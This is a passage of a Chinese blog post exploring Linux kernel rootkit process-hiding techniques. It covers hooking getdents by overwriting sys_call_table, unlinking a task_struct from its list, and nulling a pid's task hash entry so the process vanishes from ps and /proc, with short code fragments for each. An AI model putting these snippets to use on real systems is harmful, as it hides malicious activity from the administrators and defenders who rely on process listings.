class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">64-bit programs can use INT $0x80 as well, but they can only run on 64-bit kernels and therefore land in entry_INT80_compat.</span><br></pre></td></tr></table></figure><p>再往后看到<code>entry_64.S</code>的注解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This entry point can be used by 32-bit and 64-bit programs to perform 32-bit system calls.</span><br></pre></td></tr></table></figure><p>意思就是这还是一种<code>int 0x80</code>的<code>系统调用</code>方式，只不过是兼容模式。而先前我以为会调用的<code>entry_SYSCALL_64</code>实际上是<code>64</code>位下<code>syscall</code>的程序逻辑。 但是我<code>printk</code>了一下内存的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[10969.058294] [address]idt_table=0xfffffe0000000000</span><br><span class="line">[10969.058295] [address]entry_INT80_compat=0xffffffff8f801c00</span><br><span class="line">[10969.058296] [memory]e8 b2 1f 60 ff</span><br><span class="line">[10969.058297] [address]do_int80_syscall_32=0xffffffff8ee03c00</span><br><span class="line">[10969.058298] [memory]e8 92 f3 bf 0</span><br><span class="line">[10969.058298] [address]call=0xffffffff8fa03000</span><br></pre></td></tr></table></figure><p>确实是依次发现了<code>idt_table</code>-&gt;<code>entry_INT80_compat</code>-&gt;<code>do_int80_syscall_32</code>，然后再次打印内存中的<code>[address]call</code>地址时却发现调用的不是本该以为的函数，而是<code>__x86_indirect_thunk_rax</code>。 重开流程： <code>0x80</code>在哪定义的？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/arch/x86/include/asm/irq_vectors.h</span><br><span class="line">#define IA32_SYSCALL_VECTOR 0x80</span><br></pre></td></tr></table></figure><p>谁来用这个<code>0x80</code>？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#if defined(CONFIG_IA32_EMULATION)</span><br><span class="line"> SYSG(IA32_SYSCALL_VECTOR, entry_INT80_compat),</span><br><span class="line">#elif defined(CONFIG_X86_32)</span><br><span class="line"> SYSG(IA32_SYSCALL_VECTOR, entry_INT80_32),</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><blockquote><p><code>SYSG</code>是用来设置<code>系统中断门</code>的函数</p></blockquote><p>我的内核开启了<code>CONFIG_IA32_EMULATION</code>，所以<code>0x80</code>的<code>系统中断门</code>是<code>entry_INT80_compat</code>，至此是从<code>idt</code>到指定<code>系统中断门</code>的真正过程。</p><blockquote><p>意思就是说，在<code>64</code>位的系统上本该走<code>syscall</code>的道路，但是为了研究<code>idt</code>结果就强行走上了歪路。</p></blockquote><p><code>stackoverFlow</code>上有个关于这个的问题：</p><blockquote><p><a href="https://stackoverflow.com/questions/46087730/what-happens-if-you-use-the-32-bit-int-0x80-linux-abi-in-64-bit-code">What happens if you use the 32-bit int 0x80 Linux ABI in 64-bit code?</a></p></blockquote><p>实际上<code>entry_64_compat.S</code>什么时候会用到呢？先重新看一下<code>entry_64_compat.S</code>的注解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It is also used by the vDSO&#x27;s __kernel_vsyscall fallback for hardware that doesn&#x27;t support a faster entry method.</span><br></pre></td></tr></table></figure><p>并且同文件下实现的<code>entry_SYSCALL_compat</code>和<code>entry_SYSENTER_compat</code>也都提到了这个，并且都是<code>through the vDSO&#39;s __kernel_vsyscall enter here</code>。</p><blockquote><p><code>__kernel_vsyscall</code>是一个能够选取最快系统调用方式的机制。<code>syscall</code>和<code>sysenter</code>的引入是因为<code>cpu</code>的变化，那么就必然会出现有的机器并不会支持，但是<code>int 0x80</code>又太慢了，那就换一个方式，<code>glibc</code>不再直接接触到具体的系统调用的地址，而是从一个<code>约定的地址</code>调用，至于这个地址到底是什么<code>系统调用方式</code>，就让另外逻辑根据<code>机器</code>的情况来选择，而这个约定的地址就是<code>vsyscall</code>的地址。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__kernel_vsyscall:</span><br><span class="line"> CFI_STARTPROC</span><br><span class="line"> pushl %ecx</span><br><span class="line"> CFI_ADJUST_CFA_OFFSET 4</span><br><span class="line"> CFI_REL_OFFSET ecx, 0</span><br><span class="line"> pushl %edx</span><br><span class="line"> CFI_ADJUST_CFA_OFFSET 4</span><br><span class="line"> CFI_REL_OFFSET edx, 0</span><br><span class="line"> pushl %ebp</span><br><span class="line"> CFI_ADJUST_CFA_OFFSET 4</span><br><span class="line"> CFI_REL_OFFSET ebp, 0</span><br><span class="line"></span><br><span class="line"> #define SYSENTER_SEQUENCE &quot;movl %esp, %ebp; sysenter&quot;</span><br><span class="line"> #define SYSCALL_SEQUENCE &quot;movl %ecx, %ebp; syscall&quot;</span><br><span class="line"></span><br><span class="line">#ifdef CONFIG_X86_64</span><br><span class="line"> /* If SYSENTER (Intel) or SYSCALL32 (AMD) is available, use it. */</span><br><span class="line"> ALTERNATIVE_2 &quot;&quot;, SYSENTER_SEQUENCE, X86_FEATURE_SYSENTER32, \</span><br><span class="line">                   SYSCALL_SEQUENCE, X86_FEATURE_SYSCALL32</span><br><span class="line">#else</span><br><span class="line"> ALTERNATIVE &quot;&quot;, SYSENTER_SEQUENCE, X86_FEATURE_SEP</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line"> /* Enter using int $0x80 */</span><br><span class="line"> int $0x80</span><br></pre></td></tr></table></figure><p>就是说，<code>idt</code>已经拿不到<code>64</code>位所需要的<code>sys_call_table</code>了。</p><blockquote><p>不知道是不是真的是这样</p></blockquote><p>还是直接通过<code>System.map</code>或者是<code>kallsyms</code>搞吧，直接拿到<code>sys_call_table</code>地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sys_call_table = kallsyms_lookup_name(&quot;sys_call_table&quot;);</span><br><span class="line">old_sys_getdents = sys_call_table[__NR_getdents];</span><br><span class="line">sys_call_table[__NR_getdents] = new_sys_getdents;</span><br></pre></td></tr></table></figure><p><code>sys_getdents</code>这个函数的实现在<code>/fs/readdir.c</code>中，现在<code>sys_xxx</code>只有函数声明了，真实的调用都改成了<code>SYSCALL_DEFINE</code>来实现，据说这是为了解决一个<code>CVE-2009-2009</code>的漏洞。</p><blockquote><p>具体的代码替换实在不想弄了，因为看了半天感觉又涉及到了<code>VFS</code>那一块的东西，不想再跟一次了，有兴趣的参照<a href="https://github.com/hschen0712/process-hiding/blob/master/Method2/hook.c">process-hiding&#x2F;Method2&#x2F;hook.c</a></p></blockquote><h3 id="DKOM脱链"><a href="#DKOM脱链" class="headerlink" title="DKOM脱链"></a>DKOM脱链</h3><blockquote><p>本该是LKM系列的最后一个<code>hook</code>方式了，也是最为难查的一种<code>hook</code></p></blockquote><p>先前<code>VFS</code>就曾经提到过，在linux的内核里<code>进程</code>是放在链表里的。</p><blockquote><p>当前系统中的所有进程在进程终止前都会存在于各种链表中，但是只有当进程处于就绪态时会被调度器调度执行，否则永远无法被调度；当进程终止时从链表中清除，从而结束其生命过程</p></blockquote><p>当时只是提了这句话，回想一下先前<code>VFS进程隐藏</code>的实现，是通过查询到<code>进程名</code>后不去填充<code>结构体</code>生成目录，那么这儿是查询什么获取到<code>进程名</code>的？是从<code>task_struct</code>中提取到的，这是一个<code>进程结构体</code>，然而这些<code>进程结构体</code>在linux的内核中是存放在一个叫做<code>tasklist</code>的双向链表中，大概是这个样子的： 这是一个<code>双向循环链表</code> <a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/74429752.png"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/74429752.png" alt="74429752.png"></a></p><p>其中<code>next</code>和<code>prev</code>组成了一个连接对，而这在一个进程中的具体表现是<code>list_head</code>，每一个<code>task_struct</code>都包含了这个结构体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct list_head &#123;</span><br><span class="line"> struct list_head *next, *prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>结构体</code>刚创建还未插入<code>链表</code>时，<code>next</code>和<code>prev</code>都是初始化指向自身的，链表并不关心数据层的类型，只关心<code>next</code>和<code>prev</code>指向谁。这样的不同的双向循环链表结构会提供给内核中的各个相关机制使用。那<code>DKOM隐藏</code>的原理就是把指定的<code>task_struct</code>从这个链表中提取出来。</p><blockquote><p><code>断链重连</code>？</p></blockquote><p>整个攻击的顺序就应该是:</p><ol><li>获取到链表</li><li>遍历链表找到指定的<code>task_struct</code></li><li>记录指定<code>task_struct</code>的<code>list_head</code></li><li>修改指定<code>task_struct</code>前后的<code>list_head</code>，将其连接起来。</li></ol><blockquote><p>但是这儿有个问题就是不能破坏掉<code>cpu</code>调度的那一条链表，否则被隐藏的<code>进程</code>就失去了被调度的能力，彻底<code>消失</code>。</p></blockquote><p>对于一个链表来说存在遍历函数<code>list_for_each_entry</code>还有<code>list_entry</code>，如果在遍历过程中直接使用<code>list_del</code>宏的话，就会出问题，因为<code>list_del</code>的效果是把<code>next</code>和<code>prev</code>设置成<code>LIST_POISON1</code>和<code>LIST_POISON2</code>，这会导致遍历的指针移动被中断，然后内核就<code>patch</code>了，这样就需要自己缓存<code>next</code>指针让遍历操作连贯起来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">current_head=&amp;(current-&gt;thread_group);</span><br><span class="line">list_for_each_entry(current_task,current_head,thread_group)&#123;</span><br><span class="line"> if(strcmp(&quot;bash&quot;,current_task-&gt;comm)==0)&#123;</span><br><span class="line">  hide_task = current_task;</span><br><span class="line">  hide_head= current_head;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">prev_task= list_entry(hide_head-&gt;prev,typeof(*hide_task),thread_group);</span><br><span class="line">next_task= list_entry(hide_head-&gt;next,typeof(*hide_task),thread_group);</span><br><span class="line">prev_task-&gt;thread_group.next = &amp;(next_task-&gt;thread_group);</span><br><span class="line">next_task-&gt;thread_group.prev = &amp;(prev_task-&gt;thread_group);</span><br><span class="line">list_del_init(hide_head);</span><br></pre></td></tr></table></figure><p>再次查询<code>双向链表</code>时候发现确实已经脱链了，然而还是能<code>ps</code>到指定的<code>进程</code>，而且后面还各种内核崩溃，只能重新去研究看看<code>proc_pid_readdir</code>的实现，看下别人是怎么找到的<code>进程</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_pid_readdir -&gt; next_tgid -&gt; pid_task -&gt; hlist_entry</span><br></pre></td></tr></table></figure><p>这儿就不得不再引入一种新的链表结构叫做<code>进程哈希链表</code>。</p><p><a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/76368721.png"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/76368721.png" alt="76368721.png"></a></p><p>表头节点结构体:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct hlist_head &#123;</span><br><span class="line"> struct hlist_node *first;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>链表节点结构体:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct hlist_node &#123;</span><br><span class="line"> struct hlist_node *next, **pprev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中表头的<code>first</code>指向第一个节点，节点的<code>next</code>指向下一个节点的<code>next</code>，直到结尾指向<code>NULL</code>，节点的<code>prev</code>指向前一个节点的<code>next</code>，这是为了方便<code>头节点</code>和第一个<code>链表节点</code>作连接。 利用<code>DKOM脱链</code>就需要先知道对应的<code>进程</code>在链中的位置，也就是知道<code>hlist_head</code>信息，而在用户态下能够拿到的东西也只有<code>进程ID</code>而已，那就要先进行这样的一个流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pid =&gt; struct pid =&gt; task_struct</span><br><span class="line">..........下</span><br><span class="line">hiden_struct = pid_task(find_vpid(pid), PIDTYPE_PID);</span><br></pre></td></tr></table></figure><blockquote><p>这儿需要注意的是<code>pid</code>的类型为<code>pid_t</code>这代表是一个<code>virtual id</code></p></blockquote><p>针对一个<code>task_struct</code>来说</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">struct hlist_node *n =&gt;  task_struct-&gt;pids[PIDTYPE_MAX]-&gt;node</span><br><span class="line">struct hlist_head *h =&gt; task_struct-&gt;pids[PIDTYPE_MAX]-&gt;pid-&gt;task[PIDTYPE_MAX]</span><br></pre></td></tr></table></figure><p>重新看一下<code>pid_task</code>，可以发现这样一个判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (first)</span><br><span class="line">    result = hlist_entry(first, struct task_struct, pids[(type)].node);</span><br></pre></td></tr></table></figure><p>先看一下<code>hlist_entry</code>的实现，来源于<code>container_of</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define hlist_entry(ptr, type, member) container_of(ptr,type,member)</span><br></pre></td></tr></table></figure><p>这个函数会根据一个结构体变量中的域成员变量的指针来获取指向整个结构体变量的指针。</p><ul><li>一个例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct demo_struct &#123; </span><br><span class="line">           type1 member1; </span><br><span class="line">           type2 member2; </span><br><span class="line">           type3 member3; </span><br><span class="line">           type4 member4; </span><br><span class="line">&#125;;      </span><br><span class="line">struct demo_struct demo;</span><br><span class="line">type3 *memp = get_member_pointer_from_demo(); //这是demo中的member3的成员指针</span><br><span class="line">struct demo_struct *demop = container_of(memp, struct demo_struct, member3); //获得原结构体的指针</span><br></pre></td></tr></table></figure><p>这个函数是根据<code>first</code>来取得<code>task_struct</code>的，那接着看<code>first</code>怎么获取的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct hlist_node *first;</span><br><span class="line">first = rcu_dereference_check(hlist_first_rcu(&amp;pid-&gt;tasks[type]),</span><br><span class="line">                  lockdep_tasklist_lock_is_held());</span><br></pre></td></tr></table></figure><blockquote><p>到此引入了新的知识点：<code>linux的RCU机制</code></p></blockquote><p><code>first</code>是通过<code>&amp;pid-&gt;tasks[type]</code>找到的，然而这还是在一个判断中，那就再看这个判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">struct task_struct *result = NULL;</span><br><span class="line"> if (pid) &#123;</span><br></pre></td></tr></table></figure><p>再看<code>pid_task</code>的函数入口，再想一想先前如何根据一个<code>pid</code>获取到一个<code>task_struct</code>，这儿的<code>type</code>自然是<code>PIDTYPE_PID</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct task_struct *pid_task(struct pid *pid, enum pid_type type)</span><br></pre></td></tr></table></figure><p>这就是说此函数实际上是在遍历<code>tasks[PIDTYPE_PID]</code>这个哈希表从而获取到对应的进程。那先尝试一下直接把<code>pid=null</code>试试会怎样呢？</p><blockquote><p>内核崩了～猜测大概是因为断链了吧～</p></blockquote><p>重新想一想到底要研究的是什么？</p><ul><li>只有一个<code>pid_t</code>，在链表中定位到它，并将其隐藏</li></ul><p>回顾先前的一个函数<code>find_vpid</code>，这个函数怎么通过<code>pid_t</code>找到一个<code>pid</code>的？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct pid *find_vpid(int nr)</span><br><span class="line">&#123;</span><br><span class="line"> return find_pid_ns(nr, task_active_pid_ns(current));</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(find_vpid);</span><br></pre></td></tr></table></figure><p>这个函数是通过<code>find_pid_ns</code>来实现的，传入参数是<code>nr</code>和<code>ns</code>，其中<code>nr</code>也就是<code>pid_t</code>，返回的就是一个<code>pid</code>，若不存在就返回<code>pid=null</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct pid *find_pid_ns(int nr, struct pid_namespace *ns)</span><br><span class="line">&#123;</span><br><span class="line"> return idr_find(&amp;ns-&gt;idr, nr);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(find_pid_ns);</span><br></pre></td></tr></table></figure><blockquote><p>然而跟进到函数当中去后，又发现了大概涉及到了<code>IDR</code>机制。。。。</p></blockquote><p>其中<code>task_active_pid_ns</code>这一个函数的实现组合代码贴出来看一下，首先明白一下<code>current</code>指的是当前的<code>task_struct</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">struct pid_namespace *task_active_pid_ns(struct task_struct *tsk)</span><br><span class="line">&#123;</span><br><span class="line"> return ns_of_pid(task_pid(tsk));</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(task_active_pid_ns);</span><br><span class="line"></span><br><span class="line">static inline struct pid *task_pid(struct task_struct *task)</span><br><span class="line">&#123;</span><br><span class="line"> return task-&gt;pids[PIDTYPE_PID].pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * ns_of_pid() returns the pid namespace in which the specified pid was</span><br><span class="line"> * allocated.</span><br><span class="line"> *</span><br><span class="line"> * NOTE:</span><br><span class="line"> * ns_of_pid() is expected to be called for a process (task) that has</span><br><span class="line"> * an attached &#x27;struct pid&#x27; (see attach_pid(), detach_pid()) i.e @pid</span><br><span class="line"> * is expected to be non-NULL. If @pid is NULL, caller should handle</span><br><span class="line"> * the resulting NULL pid-ns.</span><br><span class="line"> */</span><br><span class="line">static inline struct pid_namespace *ns_of_pid(struct pid *pid)</span><br><span class="line">&#123;</span><br><span class="line"> struct pid_namespace *ns = NULL;</span><br><span class="line"> if (pid)</span><br><span class="line">  ns = pid-&gt;numbers[pid-&gt;level].ns;</span><br><span class="line"> return ns;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这儿就必须要去看一下<code>PID</code>的框架设计了。</p><blockquote><p>借用参考图</p></blockquote><p><a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/5963eff7-f6a7-4cf8-94c3-876deb9786bb.png"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/5963eff7-f6a7-4cf8-94c3-876deb9786bb.png" alt="5963eff7-f6a7-4cf8-94c3-876deb9786bb.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pid_hash[]: 这是一个hash表的结构，根据 pid 的 nr 值哈希到其某个表项，若有多个 pid 结构对应到同一个表项，这里解决冲突使用的是散列表法。这样，就能解决根据PID值怎样快速地找到task_struct结构体的问题了：</span><br><span class="line">首先通过 PID 计算 pid 挂接到哈希表 pid_hash[] 的表项</span><br><span class="line">遍历该表项，找到 pid 结构体中 nr 值与 PID 值相同的那个 pid</span><br><span class="line">再通过该 pid 结构体的 tasks 指针找到 node</span><br><span class="line">最后根据内核的 container_of 机制就能找到 task_struct 结构体</span><br></pre></td></tr></table></figure><blockquote><p>但这是最简单的数据结构，是没有考虑到进程间关系的。</p></blockquote><p>再借一张图：</p><p><a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/e1b0b0eb-3299-4682-819b-d1882c3b32c3.png"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/e1b0b0eb-3299-4682-819b-d1882c3b32c3.png" alt="e1b0b0eb-3299-4682-819b-d1882c3b32c3.png"></a></p><p>具体的介绍在<a href="https://www.cnblogs.com/hazir/p/linux_kernel_pid.html">Linux 内核进程管理之进程ID</a>说的很详细了，只不过其中的代码有些老了，那先前提出的种种零散的知识就可以连起来了：</p><ol><li><code>pid_task</code>的作用是根据<code>pid</code>来找到对应的<code>task_struct</code>，其运行核心是<code>container_of机制</code>，而能否返回有效的数据取决于传入的<code>pid</code>是否有效，而其中有一个<code>tasks[type]</code>哈希表的使用，能够根据一个<code>pid</code>实体找到头节点的<code>task_struct</code>实体。</li><li><code>find_pid_ns</code>则是通过<code>pid_t</code>来找到所要的<code>pid</code>实体。如果对照下老版内核(v3.16)的代码，实际很容易就可以看出来，其中直接用到了<code>pid_hash</code>表：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct pid *find_pid_ns(int nr, struct pid_namespace *ns)</span><br><span class="line">&#123;</span><br><span class="line"> struct upid *pnr;</span><br><span class="line"></span><br><span class="line"> hlist_for_each_entry_rcu(pnr,</span><br><span class="line">   &amp;pid_hash[pid_hashfn(nr, ns)], pid_chain)</span><br><span class="line">  if (pnr-&gt;nr == nr &amp;&amp; pnr-&gt;ns == ns)</span><br><span class="line">   return container_of(pnr, struct pid,</span><br><span class="line">     numbers[ns-&gt;level]);</span><br><span class="line"></span><br><span class="line"> return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为只是为了隐藏<code>ps</code>的进程，所以需要针对的是<code>proc</code>的查询方式，其中<code>pid</code>的来源和<code>find_vpid</code>差不多的实现，只不过用的是<code>find_ge_pid</code>，然而还是一样的<code>idr</code>机制，直接就可以pass了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Used by proc to find the first pid that is greater than or equal to nr.</span><br><span class="line"> *</span><br><span class="line"> * If there is a pid at nr this function is exactly the same as find_pid_ns.</span><br><span class="line"> */</span><br><span class="line">struct pid *find_ge_pid(int nr, struct pid_namespace *ns)</span><br><span class="line">&#123;</span><br><span class="line"> return idr_get_next(&amp;ns-&gt;idr, &amp;nr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那先前<code>proc_pid_readdir</code>的流程就可以换一下了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_pid_readdir -&gt; next_tgid -&gt;  find_ge_pid -&gt; pid_task -&gt; hlist_entry</span><br></pre></td></tr></table></figure><p>说白了如果只是对链表做操作，无法决定<code>struct pid</code>的获取，那就只能在后一步，劫持一下<code>first</code>了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pid_t pid = 2068;</span><br><span class="line">hiden_pid = find_vpid(pid);</span><br><span class="line">hiden_pid-&gt;tasks[PIDTYPE_PID].first=NULL;</span><br></pre></td></tr></table></figure><p>没错，就这么三行代码！！就搞定了！！ 我都不知道算不算DKOM脱链，但确实是从<code>ps</code>里消失了，而且<code>/proc</code>下也不会有这个目录。</p><p><a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/1eabe304-f0b6-4f0a-be9f-4e1e4157e2a8.png"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/1eabe304-f0b6-4f0a-be9f-4e1e4157e2a8.png" alt="1eabe304-f0b6-4f0a-be9f-4e1e4157e2a8.png"></a></p><blockquote><p>关于<code>pid_hash</code>还有<code>pid_namespace</code>这些还要补坑，因为我自己还不是理的很顺。</p></blockquote><h2 id="硬件级"><a href="#硬件级" class="headerlink" title="硬件级"></a>硬件级</h2><h3 id="Bios劫持"><a href="#Bios劫持" class="headerlink" title="Bios劫持"></a>Bios劫持</h3><blockquote><p>看了看大概的文章，需要插U盘什么的，而且有<code>EFI</code>的开发，放弃</p></blockquote><h1 id="还有很多很多技术！！！但是"><a href="#还有很多很多技术！！！但是" class="headerlink" title="还有很多很多技术！！！但是"></a>还有很多很多技术！！！但是</h1><blockquote><p>吐槽一下自己吧。</p></blockquote><p><a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/cfda8903-3152-4694-b40e-17b79caca27d.jpg"><img 